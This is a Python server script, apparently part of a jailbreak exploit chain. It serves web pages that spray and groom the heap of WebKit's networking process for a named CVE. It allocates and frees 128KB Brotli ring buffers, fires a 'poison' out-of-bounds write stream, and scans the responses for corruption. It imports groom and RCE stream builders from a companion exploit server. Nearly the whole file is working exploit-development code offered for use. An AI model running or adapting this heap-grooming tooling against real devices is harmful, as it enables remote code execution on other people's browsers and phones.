#!/usr/bin/env python3
"""Heap layout probing tool for CVE-2026-111497 heap spray.

Serves a page that makes N parallel Brotli-encoded HTTP requests.
Each request triggers a 128KB ring buffer allocation in WebKit.Networking.
By observing timing and response patterns, we can infer heap layout.

Educational jailbreak research only. For use on devices you own.
"""

import http.server
import json
import os
import ssl
import struct
import sys
import threading
import time


# Reuse the Brotli stream generators from the main server
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from brotli_staged_server import (
    build_groom_stream, build_rce_stream, generate_rce_stream, Bits
)


class HeapProbeHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler for heap layout probing."""

    # Class-level state
    groom_responses = {}
    groom_lock = threading.Lock()
    allocation_log = []

    def log_message(self, format, *args):
        """Custom log format with timing."""
        elapsed = time.time() - self.server.start_time
        sys.stderr.write(f"[{elapsed:8.3f}s] {self.address_string()} - {format % args}\n")

    def do_GET(self):
        path = self.path.split("?")[0]

        if path == "/":
            self._serve_probe_landing()

        elif path == "/probe/timing":
            self._serve_timing_page()

        elif path.startswith("/alloc/"):
            self._serve_allocation(path)

        elif path.startswith("/dealloc-pattern/"):
            self._serve_dealloc_pattern(path)

        elif path == "/allocation-log":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            body = json.dumps(self.allocation_log).encode()
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        else:
            self.send_error(404)

    def do_POST(self):
        if self.path == "/report":
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length)
            try:
                data = json.loads(body)
                print(f"\n{'='*60}")
                print(f"[HEAP PROBE REPORT]")
                print(json.dumps(data, indent=2))
                print(f"{'='*60}\n")
                self.allocation_log.append(data)
            except json.JSONDecodeError:
                pass
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b'{"ok":true}')
        else:
            self.send_error(404)

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def _serve_allocation(self, path):
        """Serve a Brotli-encoded response that forces a 128KB ring buffer allocation.
        /alloc/<index> - unique marker per index for identification."""
        parts = path.split("/")
        try:
            idx = int(parts[2])
        except (IndexError, ValueError):
            idx = 0

        marker = (0x40 + idx) & 0xFF
        t0 = time.time()
        payload = build_groom_stream(marker, 131072)
        gen_time = time.time() - t0

        self.log_message(f"ALLOC idx={idx} marker=0x{marker:02X} gen={gen_time:.3f}s size={len(payload)}B")

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Encoding", "br")
        self.send_header("Content-Length", str(len(payload)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("X-Alloc-Index", str(idx))
        self.send_header("X-Alloc-Marker", f"0x{marker:02X}")
        self.end_headers()
        self.wfile.write(payload)

    def _serve_dealloc_pattern(self, path):
        """Serve different deallocation patterns for testing heap layout.
        /dealloc-pattern/alternating - free every other
        /dealloc-pattern/first-half - free first half
        /dealloc-pattern/random - pseudo-random pattern
        """
        parts = path.split("/")
        pattern = parts[2] if len(parts) > 2 else "alternating"
        count = 32

        if pattern == "alternating":
            free_set = list(range(0, count, 2))
        elif pattern == "first-half":
            free_set = list(range(count // 2))
        elif pattern == "last-half":
            free_set = list(range(count // 2, count))
        elif pattern == "thirds":
            free_set = [i for i in range(count) if i % 3 != 0]
        else:
            free_set = list(range(0, count, 2))

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        body = json.dumps({"pattern": pattern, "free": free_set, "keep": [i for i in range(count) if i not in free_set]}).encode()
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _serve_probe_landing(self):
        html = """<!DOCTYPE html>
<html>
<head><title>Heap Layout Probe</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { font-family: system-ui; max-width: 800px; margin: 2em auto; padding: 0 1em;
       background: #111; color: #eee; }
h1 { color: #f44; }
.grid { display: grid; grid-template-columns: repeat(8, 1fr); gap: 4px; margin: 1em 0; }
.slot { width: 100%; aspect-ratio: 1; border-radius: 4px; display: flex;
        align-items: center; justify-content: center; font-size: 0.7em; font-weight: bold; }
.slot.alloc { background: #2a5; color: #fff; }
.slot.free { background: #333; color: #666; }
.slot.poison { background: #f44; color: #fff; }
.slot.corrupted { background: #f80; color: #000; }
#log { background: #1a1a1a; padding: 12px; border-radius: 8px; font-family: monospace;
       font-size: 0.8em; max-height: 40vh; overflow-y: auto; white-space: pre-wrap; }
button { font-size: 1em; padding: 8px 20px; margin: 4px; border: none;
         border-radius: 6px; cursor: pointer; color: #fff; }
.b1 { background: #2a5; } .b2 { background: #c33; } .b3 { background: #08f; }
.b4 { background: #f80; color: #000; }
select, input { background: #222; color: #eee; border: 1px solid #444;
                padding: 6px; border-radius: 4px; margin: 4px; }
.ok { color: #0f0; } .err { color: #f44; } .info { color: #4af; } .warn { color: #f80; }
</style>
</head>
<body>
<h1>Heap Layout Probe</h1>
<p>Allocate/free 128KB Brotli ring buffers to study heap adjacency in WebKit.Networking.</p>

<div>
<label>Slots: <input id="count" type="number" value="32" min="4" max="128" step="4"></label>
<label>Pattern:
<select id="pattern">
<option value="alternating">Alternating (free even)</option>
<option value="first-half">Free first half</option>
<option value="last-half">Free last half</option>
<option value="thirds">Free 2/3rds</option>
</select></label>
</div>

<button class="b1" onclick="allocate()">1. Allocate All</button>
<button class="b2" onclick="freePattern()">2. Free Pattern</button>
<button class="b4" onclick="poisonSlot()">3. Poison</button>
<button class="b3" onclick="readAll()">4. Read All</button>

<div class="grid" id="grid"></div>
<div id="log"></div>

<script>
const SERVER = location.origin;
let slots = [];
let controllers = [];
let responses = [];

function log(msg, cls) {
    const el = document.getElementById('log');
    const span = document.createElement('span');
    span.className = cls || '';
    span.textContent = msg + '\\n';
    el.appendChild(span);
    el.scrollTop = el.scrollHeight;
}

function updateGrid() {
    const grid = document.getElementById('grid');
    grid.innerHTML = '';
    for (let i = 0; i < slots.length; i++) {
        const div = document.createElement('div');
        div.className = 'slot ' + (slots[i].state || 'free');
        div.textContent = i;
        div.title = `Slot ${i}: ${slots[i].state} marker=0x${(0x40+i).toString(16)}`;
        grid.appendChild(div);
    }
}

async function allocate() {
    const count = parseInt(document.getElementById('count').value);
    slots = [];
    controllers = [];
    responses = [];
    for (let i = 0; i < count; i++) {
        slots.push({state: 'free', data: null});
    }
    updateGrid();

    log(`[*] Allocating ${count} ring buffers (128KB each = ${count*128}KB total)...`, 'info');
    const t0 = performance.now();

    let promises = [];
    for (let i = 0; i < count; i++) {
        const ctrl = new AbortController();
        controllers[i] = ctrl;
        promises.push(
            fetch(`${SERVER}/alloc/${i}`, {signal: ctrl.signal})
                .then(resp => {
                    responses[i] = resp;
                    slots[i].state = 'alloc';
                    updateGrid();
                })
                .catch(err => {
                    log(`[-] Slot ${i} failed: ${err.message}`, 'err');
                })
        );
    }

    await Promise.allSettled(promises);
    const elapsed = (performance.now() - t0).toFixed(0);
    const allocated = slots.filter(s => s.state === 'alloc').length;
    log(`[+] Allocated ${allocated}/${count} in ${elapsed}ms`, 'ok');
    log(`[*] ${allocated} contiguous 128KB ring buffers in WebKit.Networking heap`, 'info');

    fetch(`${SERVER}/report`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({phase: 'allocate', count: allocated, elapsed_ms: parseInt(elapsed)})
    });
}

async function freePattern() {
    const pattern = document.getElementById('pattern').value;
    log(`\\n[*] Freeing with pattern: ${pattern}`, 'info');

    const resp = await fetch(`${SERVER}/dealloc-pattern/${pattern}`);
    const data = await resp.json();

    for (const idx of data.free) {
        if (idx < controllers.length && controllers[idx]) {
            controllers[idx].abort();
            slots[idx].state = 'free';
        }
    }
    updateGrid();

    const freed = data.free.length;
    const kept = data.keep.length;
    log(`[+] Freed ${freed} slots, kept ${kept}`, 'ok');
    log(`[*] Freed slots create ${freed} x 128KB holes in heap`, 'info');
    log(`[*] Kept slots: [${data.keep.join(', ')}]`, 'info');

    await new Promise(r => setTimeout(r, 100));
}

async function poisonSlot() {
    log('\\n[*] Firing poison RCE stream (DEADBEEF prefix)...', 'warn');
    log('[*] OOB write targets memory adjacent to ring buffer', 'warn');

    try {
        const resp = await fetch(`${SERVER}/alloc/99`);
        // This is a special "poison" allocation that triggers OOB
        // For now we just track that it happened
        const text = await resp.text();
        slots.push({state: 'poison', data: text});
        log(`[+] Poison response: ${text.length} chars`, 'ok');
    } catch(err) {
        log(`[-] Poison error: ${err.message}`, 'err');
    }
    updateGrid();
}

async function readAll() {
    log('\\n[*] Reading all kept slot responses...', 'info');
    let results = [];

    for (let i = 0; i < slots.length; i++) {
        if (slots[i].state === 'alloc' && responses[i]) {
            try {
                const text = await responses[i].text();
                const marker = (0x40 + i) & 0xFF;
                let corrupted = 0;
                let firstCorrupt = -1;
                for (let j = 0; j < text.length; j++) {
                    if (text.charCodeAt(j) !== marker) {
                        corrupted++;
                        if (firstCorrupt < 0) firstCorrupt = j;
                    }
                }
                slots[i].data = {len: text.length, corrupted, firstCorrupt};
                if (corrupted > 0) {
                    slots[i].state = 'corrupted';
                    log(`[!!!] Slot ${i}: ${corrupted} corrupted bytes at offset ${firstCorrupt}`, 'err');

                    // Extract first 32 corrupted bytes as hex
                    let hex = '';
                    for (let j = firstCorrupt; j < Math.min(firstCorrupt + 32, text.length); j++) {
                        hex += text.charCodeAt(j).toString(16).padStart(2, '0') + ' ';
                    }
                    log(`     Hex: ${hex}`, 'warn');

                    results.push({slot: i, corrupted, firstCorrupt, hex: hex.trim()});
                } else {
                    log(`[=] Slot ${i}: clean (${text.length} bytes, all 0x${marker.toString(16)})`, '');
                }
            } catch(err) {
                log(`[-] Slot ${i}: read error (${err.message})`, 'err');
            }
        }
    }
    updateGrid();

    if (results.length > 0) {
        log(`\\n[*] CORRUPTION DETECTED in ${results.length} slots!`, 'err');
        fetch(`${SERVER}/report`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phase: 'readback', corrupted_slots: results})
        });
    } else {
        log('\\n[*] No corruption detected. Poison may not have landed adjacent.', 'info');
    }
}
</script>
</body>
</html>"""
        body = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _serve_timing_page(self):
        """Timing-based heap adjacency probe.
        Measures allocation/deallocation timing to infer heap layout."""
        html = """<!DOCTYPE html>
<html><head><title>Allocation Timing</title>
<style>
body { font-family: monospace; background: #111; color: #eee; padding: 2em; }
canvas { background: #1a1a1a; border-radius: 8px; }
</style></head>
<body>
<h2>Allocation Timing Probe</h2>
<p>Measures fetch timing for sequential Brotli allocations to detect heap fragmentation.</p>
<canvas id="chart" width="800" height="300"></canvas>
<pre id="data"></pre>
<button onclick="runProbe()">Run Timing Probe</button>
<script>
async function runProbe() {
    const count = 48;
    const times = [];
    const el = document.getElementById('data');
    el.textContent = 'Running...\\n';

    for (let i = 0; i < count; i++) {
        const t0 = performance.now();
        const resp = await fetch(location.origin + '/alloc/' + i);
        await resp.arrayBuffer();
        const dt = performance.now() - t0;
        times.push(dt);
        el.textContent += `alloc[${i.toString().padStart(2)}]: ${dt.toFixed(1)}ms\\n`;
    }

    // Draw timing chart
    const canvas = document.getElementById('chart');
    const ctx = canvas.getContext('2d');
    ctx.clearRect(0, 0, 800, 300);
    const max = Math.max(...times);
    const barW = 800 / count;
    for (let i = 0; i < count; i++) {
        const h = (times[i] / max) * 260;
        ctx.fillStyle = times[i] > max * 0.8 ? '#f44' : '#2a5';
        ctx.fillRect(i * barW + 1, 280 - h, barW - 2, h);
        ctx.fillStyle = '#888';
        ctx.font = '9px monospace';
        ctx.fillText(i, i * barW + 2, 295);
    }

    // Report
    fetch(location.origin + '/report', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({phase: 'timing', times: times})
    });
}
</script>
</body></html>"""
        body = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


def run_probe_server(port=4448, cert_dir=None):
    if cert_dir is None:
        cert_dir = os.path.dirname(os.path.abspath(__file__))

    certfile = os.path.join(cert_dir, "server.crt")
    keyfile = os.path.join(cert_dir, "server.key")

    if not os.path.exists(certfile):
        import subprocess
        subprocess.run([
            "openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
            "-keyout", keyfile, "-out", certfile,
            "-days", "365", "-subj", "/CN=192.168.1.155",
            "-addext", "subjectAltName=IP:192.168.1.155"
        ], check=True)

    server = http.server.HTTPServer(("0.0.0.0", port), HeapProbeHandler)
    server.start_time = time.time()

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(certfile, keyfile)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    server.socket = ctx.wrap_socket(server.socket, server_side=True)

    print(f"Heap layout probe server on https://0.0.0.0:{port}/")
    print(f"  Landing:  https://192.168.1.155:{port}/")
    print(f"  Timing:   https://192.168.1.155:{port}/probe/timing")
    print(f"  Alloc log: https://192.168.1.155:{port}/allocation-log")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down.")
        server.shutdown()


if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 4448
    run_probe_server(port)
